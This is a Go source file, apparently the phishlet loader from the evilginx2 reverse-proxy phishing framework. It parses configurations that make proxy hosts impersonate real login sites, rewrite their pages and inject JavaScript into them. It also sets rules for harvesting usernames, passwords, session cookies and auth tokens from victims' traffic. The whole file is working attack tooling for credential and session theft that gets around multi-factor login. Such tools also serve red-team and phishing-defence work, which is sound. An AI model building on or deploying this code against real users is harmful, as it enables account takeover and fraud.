package core

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"

	"github.com/kgretzky/evilginx2/log"
	"github.com/spf13/viper"
)

var AUTH_TOKEN_TYPES = []string{"cookie", "body", "http"}

type ProxyHost struct {
	phish_subdomain string
	orig_subdomain  string
	domain          string
	handle_session  bool
	is_landing      bool
	auto_filter     bool
}

type SubFilter struct {
	subdomain     string
	domain        string
	mime          []string
	regexp        string
	replace       string
	redirect_only bool
	with_params   []string
}

type CookieAuthToken struct {
	domain    string
	name      string
	re        *regexp.Regexp
	http_only bool
	optional  bool
	always    bool
}

type BodyAuthToken struct {
	domain string
	path   *regexp.Regexp
	name   string
	search *regexp.Regexp
}

type HttpAuthToken struct {
	domain string
	path   *regexp.Regexp
	name   string
	header string
}

type PhishletVersion struct {
	major int
	minor int
	build int
}

type PostField struct {
	tp     string
	key_s  string
	key    *regexp.Regexp
	search *regexp.Regexp
}

type ForcePostSearch struct {
	key    *regexp.Regexp `mapstructure:"key"`
	search *regexp.Regexp `mapstructure:"search"`
}

type ForcePostForce struct {
	key   string `mapstructure:"key"`
	value string `mapstructure:"value"`
}

type ForcePost struct {
	path   *regexp.Regexp    `mapstructure:"path"`
	search []ForcePostSearch `mapstructure:"search"`
	force  []ForcePostForce  `mapstructure:"force"`
	tp     string            `mapstructure:"type"`
}

type LoginUrl struct {
	domain string `mapstructure:"domain"`
	path   string `mapstructure:"path"`
}

type JsInject struct {
	trigger_domains []string         `mapstructure:"trigger_domains"`
	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
	trigger_params  []string         `mapstructure:"trigger_params"`
	script          string           `mapstructure:"script"`
}

type Phishlet struct {
	Name             string
	ParentName       string
	Path             string
	Author           string
	Version          PhishletVersion
	minVersion       string
	proxyHosts       []ProxyHost
	domains          []string
	subfilters       map[string][]SubFilter
	cookieAuthTokens map[string][]*CookieAuthToken
	bodyAuthTokens   map[string]*BodyAuthToken
	httpAuthTokens   map[string]*HttpAuthToken
	authUrls         []*regexp.Regexp
	username         PostField
	password         PostField
	landing_path     []string
	cfg              *Config
	custom           []PostField
	forcePost        []ForcePost
	login            LoginUrl
	js_inject        []JsInject
	customParams     map[string]string
	isTemplate       bool
	redirect_url     string
}

type ConfigParam struct {
	Name     string  `mapstructure:"name"`
	Default  *string `mapstructure:"default"`
	Required *bool   `mapstructure:"required"`
}

type ConfigProxyHost struct {
	PhishSub   *string `mapstructure:"phish_sub"`
	OrigSub    *string `mapstructure:"orig_sub"`
	Domain     *string `mapstructure:"domain"`
	Session    bool    `mapstructure:"session"`
	IsLanding  bool    `mapstructure:"is_landing"`
	AutoFilter *bool   `mapstructure:"auto_filter"`
}

type ConfigSubFilter struct {
	Hostname     *string   `mapstructure:"triggers_on"`
	Sub          *string   `mapstructure:"orig_sub"`
	Domain       *string   `mapstructure:"domain"`
	Search       *string   `mapstructure:"search"`
	Replace      *string   `mapstructure:"replace"`
	Mimes        *[]string `mapstructure:"mimes"`
	RedirectOnly bool      `mapstructure:"redirect_only"`
	WithParams   *[]string `mapstructure:"with_params"`
}

type ConfigAuthToken struct {
	Domain *string   `mapstructure:"domain"`
	Keys   *[]string `mapstructure:"keys"`
	Type   *string   `mapstructure:"type"`
	Path   *string   `mapstructure:"path"`
	Name   *string   `mapstructure:"name"`
	Search *string   `mapstructure:"search"`
	Header *string   `mapstructure:"header"`
}

type ConfigPostField struct {
	Key    *string `mapstructure:"key"`
	Search *string `mapstructure:"search"`
	Type   string  `mapstructure:"type"`
}

type ConfigCredentials struct {
	Username *ConfigPostField   `mapstructure:"username"`
	Password *ConfigPostField   `mapstructure:"password"`
	Custom   *[]ConfigPostField `mapstructure:"custom"`
}

type ConfigForcePostSearch struct {
	Key    *string `mapstructure:"key"`
	Search *string `mapstructure:"search"`
}

type ConfigForcePostForce struct {
	Key   *string `mapstructure:"key"`
	Value *string `mapstructure:"value"`
}

type ConfigForcePost struct {
	Path   *string                  `mapstructure:"path"`
	Search *[]ConfigForcePostSearch `mapstructure:"search"`
	Force  *[]ConfigForcePostForce  `mapstructure:"force"`
	Type   *string                  `mapstructure:"type"`
}

type ConfigLogin struct {
	Domain *string `mapstructure:"domain"`
	Path   *string `mapstructure:"path"`
}

type ConfigJsInject struct {
	TriggerDomains *[]string `mapstructure:"trigger_domains"`
	TriggerPaths   *[]string `mapstructure:"trigger_paths"`
	TriggerParams  []string  `mapstructure:"trigger_params"`
	Script         *string   `mapstructure:"script"`
}

type ConfigPhishlet struct {
	Name        string             `mapstructure:"name"`
	Params      *[]ConfigParam     `mapstructure:"params"`
	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
	AuthUrls    []string           `mapstructure:"auth_urls"`
	Credentials *ConfigCredentials `mapstructure:"credentials"`
	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
	LandingPath *[]string          `mapstructure:"landing_path"`
	LoginItem   *ConfigLogin       `mapstructure:"login"`
	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
	RedirectUrl string             `mapstructure:"redirect_url"`
}

func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
	p := &Phishlet{
		cfg: cfg,
	}
	p.Clear()

	err := p.LoadFromFile(site, path, customParams)
	if err != nil {
		return nil, err
	}
	return p, nil
}

func (p *Phishlet) Clear() {
	p.Name = ""
	p.ParentName = ""
	p.Author = ""
	p.proxyHosts = []ProxyHost{}
	p.domains = []string{}
	p.subfilters = make(map[string][]SubFilter)
	p.cookieAuthTokens = make(map[string][]*CookieAuthToken)
	p.bodyAuthTokens = make(map[string]*BodyAuthToken)
	p.httpAuthTokens = make(map[string]*HttpAuthToken)
	p.authUrls = []*regexp.Regexp{}
	p.username.key = nil
	p.username.search = nil
	p.password.key = nil
	p.password.search = nil
	p.custom = []PostField{}
	p.forcePost = []ForcePost{}
	p.customParams = make(map[string]string)
	p.isTemplate = false
	p.redirect_url = ""
}

func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
	p.Clear()

	c := viper.New()
	c.SetConfigType("yaml")
	c.SetConfigFile(path)

	err := c.ReadInConfig()
	if err != nil {
		return err
	}

	p.Name = site
	p.Path = path
	p.ParentName = ""
	p.Author = c.GetString("author")
	p.Version, err = p.parseVersion(c.GetString("min_ver"))
	if err != nil {
		return err
	}
	if !p.isVersionHigherEqual(&p.Version, "2.2.0") {
		return fmt.Errorf("this phishlet is incompatible with current version of evilginx.\nplease do the following modifications to update it:\n\n" +
			"- in each `sub_filters` item change `hostname` to `triggers_on`\n" +
			"- in each `sub_filters` item change `sub` to `orig_sub`\n" +
			"- rename section `user_regex` to `username`\n" +
			"- rename section `pass_regex` to `password`\n" +
			"- rename field `re` in both `username` and `password` to `search`\n" +
			"- field `key` in both `username` and `password` must be a regexp by default\n" +
			"- move `username` and `password` into new `credentials` section\n" +
			"- add `type` field to `username` and `password` with value 'post' or 'json'\n" +
			"- change `min_ver` to at least `2.2.0`\n" +
			"you can find the phishlet 2.2.0 file format documentation here: https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.2.0)")
	}
	if !p.isVersionHigherEqual(&p.Version, "2.3.0") {
		return fmt.Errorf("this phishlet is incompatible with current version of evilginx.\nplease do the following modifications to update it:\n\n" +
			"- replace `landing_path` with `login` section\n" +
			"- change `min_ver` to at least `2.3.0`\n" +
			"you can find the phishlet 2.3.0 file format documentation here: https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)")
	}

	fp := ConfigPhishlet{}
	err = c.Unmarshal(&fp)
	if err != nil {
		return err
	}

	if fp.Params != nil {
		if len(*fp.Params) > 0 {
			p.isTemplate = true
		}
		if customParams != nil {
			prequired := make(map[string]string)
			pall := make(map[string]string)
			params := make(map[string]string)
			for _, param := range *fp.Params {
				val := ""
				if param.Default != nil {
					val = *param.Default
				}
				params[param.Name] = val
				pall[param.Name] = val

				if param.Required != nil && *param.Required == true {
					prequired[param.Name] = val
				}
			}
			for k, v := range *customParams {
				if _, ok := pall[k]; !ok {
					log.Warning("phishlets: [%s] incorrect parameter key specified: %s", site, k)
					delete(*customParams, k)
					continue
				}
				params[k] = v
				if _, ok := prequired[k]; ok {
					delete(prequired, k)
				}
			}
			if len(prequired) > 0 {
				return fmt.Errorf("missing custom parameter values during initalization: %v", prequired)
			}
			p.isTemplate = false
			p.customParams = params
		} else {
			for _, param := range *fp.Params {
				val := ""
				if param.Required != nil && *param.Required {
					val += "(required)"
				} else if param.Default != nil {
					val = *param.Default
				}

				p.customParams[param.Name] = val
			}
		}

		/*
			if customParams != nil {
				p.customParams = *customParams
			} else {
				for _, param := range *fp.Params {
					p.customParams[param.Name] = param.Default
				}
			}*/
	}

	if fp.ProxyHosts == nil {
		return fmt.Errorf("missing `proxy_hosts` section")
	}
	if fp.AuthTokens == nil {
		return fmt.Errorf("missing `auth_tokens` section")
	}
	if fp.Credentials == nil {
		return fmt.Errorf("missing `credentials` section")
	}
	if fp.Credentials.Username == nil {
		return fmt.Errorf("credentials: missing `username` section")
	}
	if fp.Credentials.Password == nil {
		return fmt.Errorf("credentials: missing `password` section")
	}
	if fp.LoginItem == nil {
		return fmt.Errorf("missing `login` section")
	}

	for _, ph := range *fp.ProxyHosts {
		if ph.PhishSub == nil {
			return fmt.Errorf("proxy_hosts: missing `phish_sub` field")
		}
		if ph.OrigSub == nil {
			return fmt.Errorf("proxy_hosts: missing `orig_sub` field")
		}
		if ph.Domain == nil {
			return fmt.Errorf("proxy_hosts: missing `domain` field")
		}
		auto_filter := true
		if ph.AutoFilter != nil {
			auto_filter = *ph.AutoFilter
		}
		p.addProxyHost(p.paramVal(*ph.PhishSub), p.paramVal(*ph.OrigSub), p.paramVal(*ph.Domain), ph.Session, ph.IsLanding, auto_filter)
	}
	if len(p.proxyHosts) == 0 {
		return fmt.Errorf("proxy_hosts: list cannot be empty")
	}
	session_set := false
	for _, ph := range p.proxyHosts {
		if ph.handle_session {
			session_set = true
			break
		}
	}
	if !session_set {
		p.proxyHosts[0].handle_session = true
	}
	landing_set := false
	for _, ph := range p.proxyHosts {
		if ph.is_landing {
			landing_set = true
			break
		}
	}
	if !landing_set {
		p.proxyHosts[0].is_landing = true
	}

	if fp.SubFilters != nil {
		for _, sf := range *fp.SubFilters {
			if sf.Hostname == nil {
				return fmt.Errorf("sub_filters: missing `triggers_on` field")
			}
			if sf.Sub == nil {
				return fmt.Errorf("sub_filters: missing `orig_sub` field")
			}
			if sf.Domain == nil {
				return fmt.Errorf("sub_filters: missing `domain` field")
			}
			if sf.Mimes == nil {
				return fmt.Errorf("sub_filters: missing `mimes` field")
			}
			if sf.Search == nil {
				return fmt.Errorf("sub_filters: missing `search` field")
			}
			if sf.Replace == nil {
				return fmt.Errorf("sub_filters: missing `replace` field")
			}
			if sf.WithParams == nil {
				sf.WithParams = &[]string{}
			}

			for n := range *sf.Mimes {
				(*sf.Mimes)[n] = p.paramVal((*sf.Mimes)[n])
			}
			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
		}
	}
	if fp.JsInject != nil {
		for _, js := range *fp.JsInject {
			if js.TriggerDomains == nil {
				return fmt.Errorf("js_inject: missing `trigger_domains` field")
			}
			if js.TriggerPaths == nil {
				return fmt.Errorf("js_inject: missing `trigger_paths` field")
			}
			if js.Script == nil {
				return fmt.Errorf("js_inject: missing `script` field")
			}
			for n := range *js.TriggerDomains {
				(*js.TriggerDomains)[n] = p.paramVal((*js.TriggerDomains)[n])
			}
			for n := range *js.TriggerPaths {
				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
			}
			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
			if err != nil {
				return err
			}
		}
	}
	for _, at := range *fp.AuthTokens {
		ttype := "cookie"
		if at.Type != nil {
			ttype = *at.Type
		}
		if !stringExists(ttype, AUTH_TOKEN_TYPES) {
			return fmt.Errorf("auth_tokens: invalid token type: %s", ttype)
		}
		switch ttype {
		case "cookie":
			if at.Domain == nil {
				return fmt.Errorf("auth_tokens: 'domain' not found for cookie auth token")
			}
			if at.Keys == nil {
				return fmt.Errorf("auth_tokens: 'keys' not found for cookie auth token")
			}

			for n := range *at.Keys {
				(*at.Keys)[n] = p.paramVal((*at.Keys)[n])
			}
			err := p.addCookieAuthTokens(p.paramVal(*at.Domain), *at.Keys)
			if err != nil {
				return err
			}
		case "body":
			if at.Domain == nil {
				return fmt.Errorf("auth_tokens: 'domain' not found for body auth token")
			}
			if at.Path == nil {
				return fmt.Errorf("auth_tokens: 'path' not found for body auth token")
			}
			if at.Name == nil {
				return fmt.Errorf("auth_tokens: 'name' not found for body auth token")
			}
			if at.Search == nil {
				return fmt.Errorf("auth_tokens: 'search' not found for body auth token")
			}

			err := p.addBodyAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Search))
			if err != nil {
				return err
			}
		case "http":
			if at.Domain == nil {
				return fmt.Errorf("auth_tokens: 'domain' not found for http auth token")
			}
			if at.Path == nil {
				return fmt.Errorf("auth_tokens: 'path' not found for http auth token")
			}
			if at.Name == nil {
				return fmt.Errorf("auth_tokens: 'name' not found for http auth token")
			}
			if at.Header == nil {
				return fmt.Errorf("auth_tokens: 'header' not found for http auth token")
			}

			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header))
			if err != nil {
				return err
			}
		}
	}
	for _, au := range fp.AuthUrls {
		re, err := regexp.Compile(p.paramVal(au))
		if err != nil {
			return err
		}
		p.authUrls = append(p.authUrls, re)
	}

	if fp.Credentials.Username.Key == nil {
		return fmt.Errorf("credentials: missing username `key` field")
	}
	if fp.Credentials.Username.Search == nil {
		return fmt.Errorf("credentials: missing username `search` field")
	}
	if fp.Credentials.Password.Key == nil {
		return fmt.Errorf("credentials: missing password `key` field")
	}
	if fp.Credentials.Password.Search == nil {
		return fmt.Errorf("credentials: missing password `search` field")
	}

	p.username.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Key))
	if err != nil {
		return fmt.Errorf("credentials: %v", err)
	}

	p.username.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Search))
	if err != nil {
		return fmt.Errorf("credentials: %v", err)
	}

	p.password.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Key))
	if err != nil {
		return fmt.Errorf("credentials: %v", err)
	}

	p.password.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Search))
	if err != nil {
		return fmt.Errorf("credentials: %v", err)
	}

	p.username.tp = fp.Credentials.Username.Type
	if p.username.tp == "" {
		p.username.tp = "post"
	}
	p.password.tp = fp.Credentials.Password.Type
	if p.password.tp == "" {
		p.password.tp = "post"
	}
	p.username.key_s = p.paramVal(*fp.Credentials.Username.Key)
	p.password.key_s = p.paramVal(*fp.Credentials.Password.Key)

	if fp.LoginItem.Domain == nil {
		return fmt.Errorf("login: missing `domain` field")
	}
	if fp.LoginItem.Path == nil {
		return fmt.Errorf("login: missing `path` field")
	}
	p.login.domain = p.paramVal(*fp.LoginItem.Domain)
	if p.login.domain == "" {
		return fmt.Errorf("login: `domain` field cannot be empty")
	}
	login_domain_ok := false
	for _, h := range p.proxyHosts {
		var check_host string
		if h.orig_subdomain != "" {
			check_host = h.orig_subdomain + "."
		}
		check_host += h.domain
		if strings.ToLower(check_host) == strings.ToLower(p.login.domain) {
			login_domain_ok = true
			break
		}
	}
	if !login_domain_ok {
		return fmt.Errorf("login: `domain` must contain a value of one of the hostnames (`orig_subdomain` + `domain`) defined in `proxy_hosts` section")
	}

	p.login.path = p.paramVal(*fp.LoginItem.Path)
	if p.login.path == "" {
		p.login.path = "/"
	}
	if p.login.path[0] != '/' {
		p.login.path = "/" + p.login.path
	}

	if fp.Credentials.Custom != nil {
		for _, cp := range *fp.Credentials.Custom {
			var err error
			if cp.Key == nil {
				return fmt.Errorf("credentials: missing custom `key` field")
			}
			if cp.Search == nil {
				return fmt.Errorf("credentials: missing custom `search` field")
			}
			o := PostField{}
			o.key, err = regexp.Compile(p.paramVal(*cp.Key))
			if err != nil {
				return fmt.Errorf("credentials: %v", err)
			}
			o.search, err = regexp.Compile(p.paramVal(*cp.Search))
			if err != nil {
				return err
			}
			o.tp = cp.Type
			if o.tp == "" {
				o.tp = "post"
			}
			o.key_s = p.paramVal(*cp.Key)
			p.custom = append(p.custom, o)
		}
	}

	if fp.ForcePosts != nil {
		for _, op := range *fp.ForcePosts {
			var err error
			if op.Path == nil || *op.Path == "" {
				return fmt.Errorf("force_post: missing or empty `path` field")
			}
			if op.Type == nil || *op.Type != "post" {
				return fmt.Errorf("force_post: unknown type - only 'post' is currently supported")
			}
			if op.Force == nil || len(*op.Force) == 0 {
				return fmt.Errorf("force_post: missing or empty `force` field")
			}

			fpf := ForcePost{}
			fpf.path, err = regexp.Compile(p.paramVal(*op.Path))
			if err != nil {
				return err
			}
			fpf.tp = *op.Type

			if op.Search != nil {
				for _, op_s := range *op.Search {
					if op_s.Key == nil {
						return fmt.Errorf("force_post: missing search `key` field")
					}
					if op_s.Search == nil {
						return fmt.Errorf("force_post: missing search `search` field")
					}

					f_s := ForcePostSearch{}
					f_s.key, err = regexp.Compile(p.paramVal(*op_s.Key))
					if err != nil {
						return err
					}
					f_s.search, err = regexp.Compile(p.paramVal(*op_s.Search))
					if err != nil {
						return err
					}
					fpf.search = append(fpf.search, f_s)
				}
			}
			for _, op_f := range *op.Force {
				if op_f.Key == nil {
					return fmt.Errorf("force_post: missing force `key` field")
				}
				if op_f.Value == nil {
					return fmt.Errorf("force_post: missing force `value` field")
				}

				f_f := ForcePostForce{
					key:   p.paramVal(*op_f.Key),
					value: p.paramVal(*op_f.Value),
				}
				fpf.force = append(fpf.force, f_f)
			}
			p.forcePost = append(p.forcePost, fpf)
		}
	}

	if fp.LandingPath != nil {
		p.landing_path = *fp.LandingPath
		for n := range p.landing_path {
			p.landing_path[n] = p.paramVal(p.landing_path[n])
		}
	}

	if len(fp.RedirectUrl) > 0 {
		p.redirect_url = fp.RedirectUrl
	}

	return nil

}

func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
	var ret []string
	phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
	if ok {
		if !use_wildcards {
			for _, h := range p.proxyHosts {
				ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
			}
		} else {
			ret = []string{"*." + phishDomain}
		}
	}
	return ret
}

func (p *Phishlet) GetLureUrl(path string) (string, error) {
	var ret string
	host := p.cfg.GetBaseDomain()
	for _, h := range p.proxyHosts {
		if h.is_landing {
			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
			if ok {
				host = combineHost(h.phish_subdomain, phishDomain)
			}
		}
	}
	ret = "https://" + host + path
	return ret, nil
}

func (p *Phishlet) GetLoginUrl() string {
	return "https://" + p.login.domain + p.login.path
}

func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, error) {
	for _, js := range p.js_inject {
		host_matched := false
		for _, h := range js.trigger_domains {
			if h == strings.ToLower(hostname) {
				host_matched = true
				break
			}
		}
		if host_matched {
			path_matched := false
			for _, p_re := range js.trigger_paths {
				if p_re.MatchString(path) {
					path_matched = true
					break
				}
			}
			if path_matched {
				params_matched := false
				if params != nil {
					pcnt := 0
					for k := range *params {
						if stringExists(k, js.trigger_params) {
							pcnt += 1
						}
					}
					if pcnt == len(js.trigger_params) {
						params_matched = true
					}
				} else {
					params_matched = true
				}

				if params_matched {
					script := js.script
					if params != nil {
						for k, v := range *params {
							script = strings.Replace(script, "{"+k+"}", v, -1)
						}
					}
					return script, nil
				}
			}
		}
	}
	return "", fmt.Errorf("script not found")
}

func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[string]string {
	ret := make(map[string]map[string]string)
	td := make(map[string]string)
	for domain, tokens := range p.cookieAuthTokens {
		ret[domain] = make(map[string]string)
		for _, t := range tokens {
			td[t.name] = domain
		}
	}

	for k, v := range tokens {
		if domain, ok := td[k]; ok {
			ret[domain][k] = v
		}
	}
	return ret
}

func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool) {
	phish_subdomain = strings.ToLower(phish_subdomain)
	orig_subdomain = strings.ToLower(orig_subdomain)
	domain = strings.ToLower(domain)
	if !p.domainExists(domain) {
		p.domains = append(p.domains, domain)
	}

	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
}

func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool, with_params []string) {
	hostname = strings.ToLower(hostname)
	subdomain = strings.ToLower(subdomain)
	domain = strings.ToLower(domain)
	for n := range mime {
		mime[n] = strings.ToLower(mime[n])
	}
	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only, with_params: with_params})
}

func (p *Phishlet) addCookieAuthTokens(hostname string, tokens []string) error {
	p.cookieAuthTokens[hostname] = []*CookieAuthToken{}
	for _, tk := range tokens {
		st := strings.Split(tk, ":")
		if len(st) == 1 {
			st = strings.Split(tk, ",")
		}
		if len(st) > 0 {
			name := st[0]
			at := &CookieAuthToken{
				name:      name,
				re:        nil,
				http_only: false,
				optional:  false,
				always:    false,
			}
			for i := 1; i < len(st); i++ {
				switch st[i] {
				case "regexp":
					var err error
					at.re, err = regexp.Compile(name)
					if err != nil {
						return err
					}
				case "opt":
					at.optional = true
				case "always":
					at.always = true
				}
			}
			p.cookieAuthTokens[hostname] = append(p.cookieAuthTokens[hostname], at)
		}
	}
	return nil
}

func (p *Phishlet) addBodyAuthToken(hostname string, path string, name string, search string) error {
	path_re, err := regexp.Compile(path)
	if err != nil {
		return err
	}
	search_re, err := regexp.Compile(search)
	if err != nil {
		return err
	}

	p.bodyAuthTokens[name] = &BodyAuthToken{
		domain: hostname,
		path:   path_re,
		name:   name,
		search: search_re,
	}

	return nil
}

func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, header string) error {
	path_re, err := regexp.Compile(path)
	if err != nil {
		return err
	}

	p.httpAuthTokens[name] = &HttpAuthToken{
		domain: hostname,
		path:   path_re,
		name:   name,
		header: header,
	}

	return nil
}

func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string) error {
	js := JsInject{}
	for _, d := range trigger_domains {
		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
	}
	for _, d := range trigger_paths {
		re, err := regexp.Compile("^" + d + "$")
		if err == nil {
			js.trigger_paths = append(js.trigger_paths, re)
		} else {
			return fmt.Errorf("js_inject: %v", err)
		}
	}
	for _, d := range trigger_params {
		js.trigger_params = append(js.trigger_params, strings.ToLower(d))
	}
	js.script = script

	p.js_inject = append(p.js_inject, js)
	return nil
}

func (p *Phishlet) domainExists(domain string) bool {
	for _, d := range p.domains {
		if domain == d {
			return true
		}
	}
	return false
}

func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
	if tokens, ok := p.cookieAuthTokens[domain]; ok {
		for _, at := range tokens {
			if at.re != nil {
				if at.re.MatchString(token) {
					return at
				}
			} else if at.name == token {
				return at
			}
		}
	}
	return nil
}

func (p *Phishlet) isAuthToken(domain string, token string) bool {
	if at := p.getAuthToken(domain, token); at != nil {
		return true
	}
	return false
}

func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
	if at := p.getAuthToken(domain, token); at != nil {
		return at.http_only
	}
	return false
}

func (p *Phishlet) MimeExists(mime string) bool {
	return false
}

func (p *Phishlet) isVersionHigherEqual(pv *PhishletVersion, cver string) bool {
	cv, err := p.parseVersion(cver)
	if err != nil {
		return false
	}

	if pv.major > cv.major {
		return true
	}
	if pv.major == cv.major && pv.minor >= cv.minor {
		return true
	}
	return false
}

func (p *Phishlet) parseVersion(ver string) (PhishletVersion, error) {
	ret := PhishletVersion{}
	va := strings.Split(ver, ".")
	if len(va) != 3 {
		return ret, fmt.Errorf("invalid version format (must be X.Y.Z)")
	}
	var err error
	ret.major, err = strconv.Atoi(va[0])
	if err != nil {
		return ret, err
	}
	ret.minor, err = strconv.Atoi(va[1])
	if err != nil {
		return ret, err
	}
	ret.build, err = strconv.Atoi(va[2])
	if err != nil {
		return ret, err
	}
	return ret, nil
}

func (p *Phishlet) paramVal(s string) string {
	var ret string = s
	if !p.isTemplate {
		for k, v := range p.customParams {
			ret = strings.ReplaceAll(ret, "{"+k+"}", v)
		}
	}
	return ret
}
